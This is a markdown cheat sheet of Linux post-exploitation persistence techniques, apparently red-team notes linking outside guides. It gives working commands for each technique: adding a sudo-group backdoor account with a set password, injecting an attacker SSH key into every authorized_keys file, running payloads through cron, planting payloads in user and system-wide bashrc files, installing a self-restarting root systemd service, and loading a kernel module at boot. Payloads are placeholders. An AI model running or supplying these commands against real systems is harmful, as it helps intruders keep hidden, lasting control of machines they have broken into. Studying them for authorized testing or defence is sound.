# Linux persistence

## Things to remember
  *  Enumerate defenses and choose persistence mechanisms carefully
  *  These methods and more covered on [Linode](https://www.linode.com/docs/guides/linux-red-team-persistence-techniques/), [hadess.io](https://hadess.io/the-art-of-linux-persistence/), and [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/linux-persistence/)

## [Credentials](https://www.linode.com/docs/guides/linux-red-team-persistence-techniques/#creating-a-privileged-local-account)
  *  Credentials are the easiest form of persistence
  *  Any form of credential can often be used
      *  Includes passwords, SSH keys, etc.
  *  [Create a new user account](https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/linux-persistence/#add-a-root-user) and/or dump credentials
      *  Set UID/GID to `0` or add to `sudo` group/`sudoers` file
  *  Users with duplicate UID/GID cannot login via SSH

```
useradd -G sudo -s /bin/bash -p $(echo 'password' | openssl passwd -stdin) hacker
```

## [Authorized SSH keys](https://www.linode.com/docs/guides/linux-red-team-persistence-techniques/#persistence-via-ssh-keys)
  *  Add new SSH keys to a user's [`authorized_keys`](http://man.he.net/man5/authorized_keys) file
      *  Persists through password changes
      *  User/host in `authorized_keys` entry does not have to be real
      *  One-liner as root to add SSH pubkey to all `authorized_keys` files

```
ssh-keygen
echo 'ssh-rsa [BASE64 PUBLIC KEY STRING] kali@kali' >> /home/bob/.ssh/authorized_keys
for file in $(find / -name authorized_keys 2>/dev/null); do echo 'ssh-rsa [BASE64 PUBLIC KEY STRING] kali@kali' >> $file; done
```

## [Cronjobs](https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/linux-persistence/#suid-binary)
  *  Create scheduled tasks to execute code at an interval
      *  See [cron file syntax](https://man7.org/linux/man-pages/man5/crontab.5.html) for more control over timing

// Execute evil.sh or payload command every minute
```
echo "* * * * * bash /path/to/evil.sh" | crontab
echo "* * * * * bash -c '[PAYLOAD COMMAND]'" | crontab
```

## [Shell configuration files](https://www.linode.com/docs/guides/linux-red-team-persistence-techniques/#unix-shell-configuration-modification)
  *  Shell config files are executed at various points throughout a shell's lifetime
      *  `~/.bashrc` is most common but [many more exist](https://tldp.org/LDP/Bash-Beginners-Guide/html/sect_03_01.html)
      *  Config files located outside home directories apply to all users
  *  Useful outside of persistence, [InternalAllTheThings example](https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/linux-persistence/#backdooring-a-users-bash_rc) demonstrates stealing a victim's password
  *  Choose payload carefully, some payloads may break the user's shell

```
echo "[PAYLOAD COMMAND] &" >> ~/.bashrc
echo "[PAYLOAD COMMAND] &" >> /etc/bash.bashrc
```

## [Services](https://hadess.io/the-art-of-linux-persistence/)
  *  Create or [modify](https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/linux-persistence/#backdooring-a-startup-service) a service to execute code at boot/an interval
      *  See `systemd.service` [man page](https://www.freedesktop.org/software/systemd/man/latest/systemd.service.html) for more config options

// Execute payload command on boot and every 10 seconds when disconnected
```
cat /etc/systemd/system/evil.service 
[Unit]
After=network.target

[Service]
Restart=always
RestartSec=10
User=root
ExecStart=[PAYLOAD COMMAND]

[Install]
WantedBy=multi-user.target
```

```
systemctl enable evil
systemctl start evil
```

## [Kernel modules](https://github.com/SpacemanHenry/hacknotes/tree/main/Post%20Exploitation/Persistence/Linux/Kernel%20Module)
  *  [Compile/configure a kernel module](https://tldp.org/LDP/lkmpg/2.6/html/c119.html) to execute code when loaded at boot
      *  Download/install headers for target kernel version to compile off-target
      *  Target kernel version headers not easily installable? Consider a VM 
  *  [`module.c`](https://github.com/SpacemanHenry/hacknotes/blob/main/Post%20Exploitation/Persistence/Linux/Kernel%20Module/module.c) spawns userspace programs from kernelspace
      *  Resulting process is visible in process listings
      *  Consider researching malicious operations from kernelspace only

// Install kernel module for loading at boot time
```
cp evil.ko /lib/modules/$(uname -r)
echo evil > /lib/modules-load.d/evil.conf
depmod -a
insmod evil.ko
```
